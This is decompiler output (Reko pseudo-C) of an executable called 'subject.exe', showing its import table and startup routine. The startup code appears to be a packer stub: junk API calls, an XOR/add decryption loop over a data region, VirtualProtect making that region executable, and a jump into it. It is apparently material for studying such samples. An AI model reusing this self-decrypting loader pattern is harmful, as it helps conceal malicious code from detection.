// subject_idata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw429000 = 1959466595; // 00429000
<anonymous> g_t429027 = <code>; // 00429027
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__ReleaseDC = &g_t25460; // 00425000
<anonymous> * __imp__SetRectEmpty = &g_t2546C; // 00425004
<anonymous> * __imp__GetWindow = &g_t2547C; // 00425008
<anonymous> * __imp__SetWindowLongA = &g_t25488; // 0042500C
<anonymous> * __imp__KillTimer = &g_t2549A; // 00425010
<anonymous> * __imp__CreateWindowExW = &g_t254A6; // 00425014
<anonymous> * __imp__CharUpperA = &g_t254B8; // 00425018
<anonymous> * __imp__SetPropW = &g_t254C6; // 0042501C
<anonymous> * __imp__EndPaint = &g_t254D2; // 00425020
<anonymous> * __imp__GetClassNameW = &g_t254DE; // 00425024
<anonymous> * __imp__UpdateWindow = &g_t254EE; // 00425028
<anonymous> * __imp__CharNextW = &g_t254FE; // 0042502C
<anonymous> * __imp__LoadBitmapA = &g_t2550A; // 00425030
<anonymous> * __imp__GetActiveWindow = &g_t25518; // 00425034
<anonymous> * __imp__GetDC = &g_t2552A; // 00425038
<anonymous> * __imp__SetCursor = &g_t25532; // 0042503C
<anonymous> * __imp__SetRect = &g_t2553E; // 00425040
<anonymous> * __imp__LoadCursorA = &g_t25548; // 00425044
<anonymous> * __imp__BeginPaint = &g_t25556; // 00425048
<anonymous> * __imp__MapWindowPoints = &g_t25564; // 0042504C
<anonymous> * __imp__GetMessageW = &g_t25576; // 00425050
<anonymous> * __imp__SendDlgItemMessageW = &g_t25584; // 00425054
<anonymous> * __imp__GetMenuItemCount = &g_t2559A; // 00425058
<anonymous> * __imp__ClientToScreen = &g_t255AE; // 0042505C
<anonymous> * __imp__IntersectRect = &g_t255C0; // 00425060
<anonymous> * __imp__GetSysColorBrush = &g_t255D0; // 00425064
<anonymous> * __imp__SetTimer = &g_t255E4; // 00425068
<anonymous> * __imp__GetCursorPos = &g_t255F0; // 0042506C
<anonymous> * __imp__OffsetRect = &g_t25600; // 00425070
<anonymous> * __imp__DeleteMenu = &g_t2560E; // 00425074
<anonymous> * __imp__GetWindowTextA = &g_t2561C; // 00425078
<anonymous> * __imp__GetFileSize = &g_t2563C; // 00425080
<anonymous> * __imp__InterlockedDecrement = &g_t2564A; // 00425084
<anonymous> * __imp__GetVersionExA = &g_t25662; // 00425088
<anonymous> * __imp__InterlockedIncrement = &g_t25672; // 0042508C
<anonymous> * __imp__FindNextFileA = &g_t2568A; // 00425090
<anonymous> * __imp__QueryPerformanceCounter = &g_t2569A; // 00425094
<anonymous> * __imp__SetEndOfFile = &g_t256B4; // 00425098
<anonymous> * __imp__GetEnvironmentVariableA = &g_t256C4; // 0042509C
<anonymous> * __imp__GetOEMCP = &g_t256DE; // 004250A0
<anonymous> * __imp__GetEnvironmentStringsW = &g_t256EA; // 004250A4
<anonymous> * __imp__SizeofResource = &g_t25704; // 004250A8
<anonymous> * __imp__GetVersion = &g_t25716; // 004250AC
<anonymous> * __imp__GetLastError = &g_t25724; // 004250B0
<anonymous> * __imp__ExitProcess = &g_t25734; // 004250B4
<anonymous> * __imp__LoadLibraryA = &g_t25742; // 004250B8
<anonymous> * __imp__GetModuleFileNameW = &g_t25752; // 004250BC
<anonymous> * __imp__GetTempPathW = &g_t25768; // 004250C0
<anonymous> * __imp__OpenProcess = &g_t25778; // 004250C4
<anonymous> * __imp__GetSystemInfo = &g_t25786; // 004250C8
<anonymous> * __imp__RemoveDirectoryA = &g_t25796; // 004250CC
<anonymous> * __imp__SetHandleCount = &g_t257AA; // 004250D0
<anonymous> * __imp__LCMapStringA = &g_t257BC; // 004250D4
<anonymous> * __imp__GetComputerNameW = &g_t257CC; // 004250D8
<anonymous> * __imp__SetUnhandledExceptionFilter = &g_t257E0; // 004250DC
<anonymous> * __imp__HeapAlloc = &g_t257FE; // 004250E0
<anonymous> * __imp__FindResourceA = &g_t2580A; // 004250E4
<anonymous> * __imp__GetCommandLineA = &g_t2581A; // 004250E8
<anonymous> * __imp__GetCommandLineW = &g_t2582C; // 004250EC
<anonymous> * __imp__FreeLibrary = &g_t2583E; // 004250F0
<anonymous> * __imp__CreateProcessA = &g_t2584C; // 004250F4
<anonymous> * __imp__SetEvent = &g_t2585E; // 004250F8
<anonymous> * __imp__GetModuleFileNameA = &g_t2586A; // 004250FC
<anonymous> * __imp__WriteFile = &g_t25880; // 00425100
<anonymous> * __imp__WideCharToMultiByte = &g_t2588C; // 00425104
<anonymous> * __imp__SetFileAttributesW = &g_t258A2; // 00425108
<anonymous> * __imp__CreateFileW = &g_t258B8; // 0042510C
<anonymous> * __imp__GetACP = &g_t258C6; // 00425110
<anonymous> * __imp__TerminateProcess = &g_t258D0; // 00425114
<anonymous> * __imp__MultiByteToWideChar = &g_t258E4; // 00425118
<anonymous> * __imp__GlobalUnlock = &g_t258FA; // 0042511C
<anonymous> * __imp__CompareStringA = &g_t2590A; // 00425120
<anonymous> * __imp__LoadResource = &g_t2591C; // 00425124
<anonymous> * __imp__CreateDirectoryW = &g_t2592C; // 00425128
<anonymous> * __imp__Sleep = &g_t25940; // 0042512C
<anonymous> * __imp__GetStdHandle = &g_t25948; // 00425130
<anonymous> * __imp__LeaveCriticalSection = &g_t25958; // 00425134
<anonymous> * __imp__GetStartupInfoA = &g_t25970; // 00425138
<anonymous> * __imp__InterlockedCompareExchange = &g_t25982; // 0042513C
<anonymous> * __imp__CloseHandle = &g_t259A0; // 00425140
<anonymous> * __imp__GetDateFormatA = &g_t259AE; // 00425144
<anonymous> * __imp__EnterCriticalSection = &g_t259C0; // 00425148
<anonymous> * __imp__InitializeCriticalSection = &g_t259D8; // 0042514C
<anonymous> * __imp__CreateProcessW = &g_t259F4; // 00425150
<anonymous> * __imp__GetCPInfo = &g_t25A06; // 00425154
<anonymous> * __imp__CreateFileA = &g_t25A12; // 00425158
<anonymous> * __imp__GetSystemDirectoryW = &g_t25A20; // 0042515C
<anonymous> * __imp__VirtualQuery = &g_t25A36; // 00425160
<anonymous> * __imp__GetTickCount = &g_t25A46; // 00425164
<anonymous> * __imp__TlsSetValue = &g_t25A56; // 00425168
<anonymous> * __imp__GetProcAddress = &g_t25A64; // 0042516C
<anonymous> * __imp__GetCurrentProcessId = &g_t25A76; // 00425170
<anonymous> * __imp__TlsGetValue = &g_t25A8C; // 00425174
<anonymous> * __imp__SetErrorMode = &g_t25A9A; // 00425178
<anonymous> * __imp__GetModuleHandleA = &g_t25AAA; // 0042517C
<anonymous> * __imp__HeapDestroy = &g_t25ABE; // 00425180
<anonymous> * __imp__LocalAlloc = &g_t25ACC; // 00425184
<anonymous> * __imp__UnlockFile = &g_t25ADA; // 00425188
<anonymous> * __imp__VirtualProtect = &g_t25AE8; // 0042518C
<anonymous> * __imp__VirtualFree = &g_t25AFA; // 00425190
<anonymous> * __imp__OutputDebugStringA = &g_t25B08; // 00425194
<anonymous> * __imp__GetCurrentThreadId = &g_t25B1E; // 00425198
<anonymous> * __imp__DeleteCriticalSection = &g_t25B34; // 0042519C
<anonymous> * __imp__GetProcessHeap = &g_t25B4C; // 004251A0
<anonymous> * __imp__FindClose = &g_t25B5E; // 004251A4
<anonymous> * __imp__atoi = &g_t25B76; // 004251AC
<anonymous> * __imp___initterm = &g_t25B7E; // 004251B0
<anonymous> * __imp__memcpy = &g_t25B8A; // 004251B4
<anonymous> * __imp__malloc = &g_t25B94; // 004251B8
<anonymous> * __imp___controlfp = &g_t25B9E; // 004251BC
<anonymous> * __imp____set_app_type = &g_t25BAC; // 004251C0
<anonymous> * __imp___wcsicmp = &g_t25BBE; // 004251C4
<anonymous> * __imp___wcsnicmp = &g_t25BCA; // 004251C8
<anonymous> * __imp____p__fmode = &g_t25BD6; // 004251CC
<anonymous> * __imp__memset = &g_t25BE4; // 004251D0
<anonymous> * __imp___amsg_exit = &g_t25BEE; // 004251D4
<anonymous> * __imp____p__commode = &g_t25BFC; // 004251D8
<anonymous> * __imp___adjust_fdiv = &g_t25C0C; // 004251DC
<anonymous> * __imp__??3@YAXPAX@Z = &g_t25C1C; // 004251E0
<anonymous> * __imp__StringFromGUID2 = &g_t25C36; // 004251E8
<anonymous> * __imp__StringFromCLSID = &g_t25C48; // 004251EC
<anonymous> * __imp__CoCreateInstance = &g_t25C5A; // 004251F0
word32 g_dw42525C = 0x00025460; // 0042525C
word32 g_dw425260 = 0x0002546C; // 00425260
word32 g_dw425264 = 152700; // 00425264
word32 g_dw425268 = 152712; // 00425268
word32 g_dw42526C = 0x0002549A; // 0042526C
word32 g_dw425270 = 152742; // 00425270
word32 g_dw425274 = 0x000254B8; // 00425274
word32 g_dw425278 = 152774; // 00425278
word32 g_dw42527C = 0x000254D2; // 0042527C
word32 g_dw425280 = 0x000254DE; // 00425280
word32 g_dw425284 = 0x000254EE; // 00425284
word32 g_dw425288 = 0x000254FE; // 00425288
word32 g_dw42528C = 0x0002550A; // 0042528C
word32 g_dw425290 = 0x00025518; // 00425290
word32 g_dw425294 = 0x0002552A; // 00425294
word32 g_dw425298 = 0x00025532; // 00425298
word32 g_dw42529C = 0x0002553E; // 0042529C
word32 g_dw4252A0 = 0x00025548; // 004252A0
word32 g_dw4252A4 = 0x00025556; // 004252A4
word32 g_dw4252A8 = 0x00025564; // 004252A8
word32 g_dw4252AC = 0x00025576; // 004252AC
word32 g_dw4252B0 = 0x00025584; // 004252B0
word32 g_dw4252B4 = 0x0002559A; // 004252B4
word32 g_dw4252B8 = 0x000255AE; // 004252B8
word32 g_dw4252BC = 0x000255C0; // 004252BC
word32 g_dw4252C0 = 0x000255D0; // 004252C0
word32 g_dw4252C4 = 0x000255E4; // 004252C4
word32 g_dw4252C8 = 0x000255F0; // 004252C8
word32 g_dw4252CC = 0x00025600; // 004252CC
word32 g_dw4252D0 = 0x0002560E; // 004252D0
word32 g_dw4252D4 = 153116; // 004252D4
word32 g_dw4252DC = 153148; // 004252DC
word32 g_dw4252E0 = 153162; // 004252E0
word32 g_dw4252E4 = 0x00025662; // 004252E4
word32 g_dw4252E8 = 0x00025672; // 004252E8
word32 g_dw4252EC = 153226; // 004252EC
word32 g_dw4252F0 = 153242; // 004252F0
word32 g_dw4252F4 = 0x000256B4; // 004252F4
word32 g_dw4252F8 = 0x000256C4; // 004252F8
word32 g_dw4252FC = 153310; // 004252FC
word32 g_dw425300 = 153322; // 00425300
word32 g_dw425304 = 0x00025704; // 00425304
word32 g_dw425308 = 153366; // 00425308
word32 g_dw42530C = 0x00025724; // 0042530C
word32 g_dw425310 = 153396; // 00425310
word32 g_dw425314 = 0x00025742; // 00425314
word32 g_dw425318 = 0x00025752; // 00425318
word32 g_dw42531C = 153448; // 0042531C
word32 g_dw425320 = 0x00025778; // 00425320
word32 g_dw425324 = 0x00025786; // 00425324
word32 g_dw425328 = 153494; // 00425328
word32 g_dw42532C = 153514; // 0042532C
word32 g_dw425330 = 153532; // 00425330
word32 g_dw425334 = 0x000257CC; // 00425334
word32 g_dw425338 = 0x000257E0; // 00425338
word32 g_dw42533C = 153598; // 0042533C
word32 g_dw425340 = 0x0002580A; // 00425340
word32 g_dw425344 = 153626; // 00425344
word32 g_dw425348 = 0x0002582C; // 00425348
word32 g_dw42534C = 153662; // 0042534C
word32 g_dw425350 = 153676; // 00425350
word32 g_dw425354 = 0x0002585E; // 00425354
word32 g_dw425358 = 0x0002586A; // 00425358
word32 g_dw42535C = 0x00025880; // 0042535C
word32 g_dw425360 = 0x0002588C; // 00425360
word32 g_dw425364 = 0x000258A2; // 00425364
word32 g_dw425368 = 0x000258B8; // 00425368
word32 g_dw42536C = 0x000258C6; // 0042536C
word32 g_dw425370 = 0x000258D0; // 00425370
word32 g_dw425374 = 153828; // 00425374
word32 g_dw425378 = 153850; // 00425378
word32 g_dw42537C = 0x0002590A; // 0042537C
word32 g_dw425380 = 153884; // 00425380
word32 g_dw425384 = 0x0002592C; // 00425384
word32 g_dw425388 = 0x00025940; // 00425388
word32 g_dw42538C = 0x00025948; // 0042538C
word32 g_dw425390 = 0x00025958; // 00425390
word32 g_dw425394 = 0x00025970; // 00425394
word32 g_dw425398 = 0x00025982; // 00425398
word32 g_dw42539C = 0x000259A0; // 0042539C
word32 g_dw4253A0 = 154030; // 004253A0
word32 g_dw4253A4 = 0x000259C0; // 004253A4
word32 g_dw4253A8 = 0x000259D8; // 004253A8
word32 g_dw4253AC = 154100; // 004253AC
word32 g_dw4253B0 = 154118; // 004253B0
word32 g_dw4253B4 = 0x00025A12; // 004253B4
word32 g_dw4253B8 = 154144; // 004253B8
word32 g_dw4253BC = 154166; // 004253BC
word32 g_dw4253C0 = 154182; // 004253C0
word32 g_dw4253C4 = 0x00025A56; // 004253C4
word32 g_dw4253C8 = 154212; // 004253C8
word32 g_dw4253CC = 0x00025A76; // 004253CC
word32 g_dw4253D0 = 154252; // 004253D0
word32 g_dw4253D4 = 0x00025A9A; // 004253D4
word32 g_dw4253D8 = 0x00025AAA; // 004253D8
word32 g_dw4253DC = 0x00025ABE; // 004253DC
word32 g_dw4253E0 = 0x00025ACC; // 004253E0
word32 g_dw4253E4 = 0x00025ADA; // 004253E4
word32 g_dw4253E8 = 154344; // 004253E8
word32 g_dw4253EC = 0x00025AFA; // 004253EC
word32 g_dw4253F0 = 0x00025B08; // 004253F0
word32 g_dw4253F4 = 0x00025B1E; // 004253F4
word32 g_dw4253F8 = 154420; // 004253F8
word32 g_dw4253FC = 154444; // 004253FC
word32 g_dw425400 = 0x00025B5E; // 00425400
word32 g_dw425408 = 154486; // 00425408
word32 g_dw42540C = 154494; // 0042540C
word32 g_dw425410 = 154506; // 00425410
word32 g_dw425414 = 154516; // 00425414
word32 g_dw425418 = 154526; // 00425418
word32 g_dw42541C = 154540; // 0042541C
word32 g_dw425420 = 154558; // 00425420
word32 g_dw425424 = 154570; // 00425424
word32 g_dw425428 = 154582; // 00425428
word32 g_dw42542C = 154596; // 0042542C
word32 g_dw425430 = 0x00025BEE; // 00425430
word32 g_dw425434 = 0x00025BFC; // 00425434
word32 g_dw425438 = 0x00025C0C; // 00425438
word32 g_dw42543C = 0x00025C1C; // 0042543C
word32 g_dw425444 = 0x00025C36; // 00425444
word32 g_dw425448 = 154696; // 00425448
word32 g_dw42544C = 154714; // 0042544C
// subject_text_0002.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004244C2: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ptr32 fp;
	word32 ebp;
	GetCurrentThreadId();
	GetCommandLineW();
	GetOEMCP();
	GetCommandLineA();
	Eq_2 eax_32 = GetModuleHandleA(0x00431076);
	Eq_2 eax_52 = CreateFileA(0x00431080, 0x00, 0x01, 0x00, 0x03, 0x0101, 0x00);
	Eq_2 eax_204 = GetProcAddress(eax_32, 0x0043102C);
	do
	{
		struct Eq_49 * esp_64;
		Eq_2 eax_65;
		eax_204();
		esp_64->tFFFFFFFC.u0 = (DWORD) eax_65;
		esp_64->tFFFFFFF8.u0 = 29499;
		esp_64->ptrFFFFFFF4 = &g_dw429000;
		esp_64->tFFFFFFF0.u0 = 0x00;
		esp_64->tFFFFFFEC.u0 = 0x0107;
		esp_64->tFFFFFFE8.u0 = 0x03;
		esp_64->tFFFFFFE4.u0 = 0x00;
		esp_64->tFFFFFFE0.u0 = 0x04;
		esp_64->tFFFFFFDC.u0 = 0xC0000000;
		esp_64->tFFFFFFD8.u0 = 0x00431000;
		CreateFileA(esp_64->tFFFFFFD8.u0, esp_64->tFFFFFFDC.u0, esp_64->tFFFFFFE0.u0, esp_64->tFFFFFFE4.u0, esp_64->tFFFFFFE8.u0, esp_64->tFFFFFFEC.u0, esp_64->tFFFFFFF0.u0);
		fn0042474E(esp_64->ptrFFFFFFF4, esp_64->tFFFFFFF8.u0, esp_64->tFFFFFFFC.u0);
		esp_64->tFFFFFFFC.u0 = (DWORD) eax_52;
		esp_64->tFFFFFFF8.u0 = 0x00;
		LoadResource(esp_64->tFFFFFFF8.u0, esp_64->tFFFFFFFC.u0);
		GetCommandLineW();
		struct Eq_49 * esp_103 = esp_64;
		do
		{
			struct Eq_48 * esp_109 = esp_103 - 4;
			esp_109->t0000.u0 = (DWORD) (fp - 0x1C);
			esp_109->tFFFFFFFC.u0 = 0x40;
			esp_109->tFFFFFFF8.u0 = 29499;
			GetOEMCP();
			esp_109->tFFFFFFF4.u0 = 0x00429000;
			GetCommandLineA();
			VirtualProtect(esp_109->tFFFFFFF4.u0, esp_109->tFFFFFFF8.u0, esp_109->tFFFFFFFC.u0, esp_109->t0000.u0);
			esp_109->t0000.u0 = 0x00;
			esp_109->tFFFFFFFC.u0 = 0x26;
			esp_109->tFFFFFFF8.u0 = 0x03;
			esp_109->tFFFFFFF4.u0 = 0x00;
			esp_109->tFFFFFFF0.u0 = 0x06;
			esp_109->tFFFFFFEC.u0 = 0x00;
			esp_109->tFFFFFFE8.u0 = 0x00431045;
			CreateFileA(esp_109->tFFFFFFE8.u0, esp_109->tFFFFFFEC.u0, esp_109->tFFFFFFF0.u0, esp_109->tFFFFFFF4.u0, esp_109->tFFFFFFF8.u0, esp_109->tFFFFFFFC.u0, esp_109->t0000.u0);
			esp_109->t0004.u0 = 0x00;
			esp_109->t0000.u0 = 0xA4;
			esp_109->tFFFFFFFC.u0 = 0x03;
			esp_109->tFFFFFFF8.u0 = 0x00;
			esp_109->tFFFFFFF4.u0 = 0x00;
			esp_109->tFFFFFFF0.u0 = 0xE0000000;
			esp_109->tFFFFFFEC.u0 = 4395045;
			CreateFileA(esp_109->tFFFFFFEC.u0, esp_109->tFFFFFFF0.u0, esp_109->tFFFFFFF4.u0, esp_109->tFFFFFFF8.u0, esp_109->tFFFFFFFC.u0, esp_109->t0000.u0, esp_109->t0004.u0);
			GetCommandLineA();
			esp_109->t0008.u0 = (DWORD) eax_52;
			esp_109->t0004.u0 = 0x00;
			SizeofResource(esp_109->t0004.u0, esp_109->t0008.u0);
			esp_109->t000C.u0 = 0x00;
			esp_109->t0008.u0 = 0x26;
			esp_109->t0004.u0 = 0x03;
			esp_109->t0000.u0 = 0x00;
			esp_109->tFFFFFFFC.u0 = 0x02;
			esp_109->tFFFFFFF8.u0 = 0x60000000;
			esp_109->tFFFFFFF4.u0 = 0x00431060;
			esp_103 = (struct Eq_49 *) ((char *) &esp_109->t000C + 4);
		} while (CreateFileA(esp_109->tFFFFFFF4.u0, esp_109->tFFFFFFF8.u0, esp_109->tFFFFFFFC.u0, esp_109->t0000.u0, esp_109->t0004.u0, esp_109->t0008.u0, esp_109->t000C.u0) != ~0x00);
		esp_109->t000C.u0 = 0x00;
		esp_109->t0008.u0 = 0x87;
		esp_109->t0004.u0 = 0x03;
		esp_109->t0000.u0 = 0x00;
		esp_109->tFFFFFFFC.u0 = 0x07;
		esp_109->tFFFFFFF8.u0 = 0xA0000000;
		esp_109->tFFFFFFF4.u0 = 0x0043103D;
		eax_204 = CreateFileA(esp_109->tFFFFFFF4.u0, esp_109->tFFFFFFF8.u0, esp_109->tFFFFFFFC.u0, esp_109->t0000.u0, esp_109->t0004.u0, esp_109->t0008.u0, esp_109->t000C.u0);
	} while (eax_204 != ~0x00);
	Eq_2 eax_219;
	g_t429027();
	return eax_219;
}

// 0042474E: void fn0042474E(Stack (ptr32 word32) dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C)
// Called from:
//      Win32CrtStartup
void fn0042474E(word32 * dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C)
{
	word32 * edi_17 = dwArg04;
	uint32 edx_19 = dwArg08 >> 0x02;
	do
	{
		*edi_17 -= dwArg0C;
		Mem28[edi_17 + 0x00:word32] = Mem26[edi_17 + 0x00:word32] + dwArg0C;
		*edi_17 -= dwArg0C;
		*edi_17 = *edi_17 ^ 3070175363;
		*edi_17 += 3161557686;
		*edi_17 += 0xF02C43D1;
		*edi_17 += 4232936312;
		*edi_17 = *edi_17 ^ dwArg0C;
		Mem44[edi_17 + 0x00:word32] = Mem41[edi_17 + 0x00:word32] + dwArg0C;
		++edi_17;
		--edx_19;
	} while (edx_19 != 0x00);
}

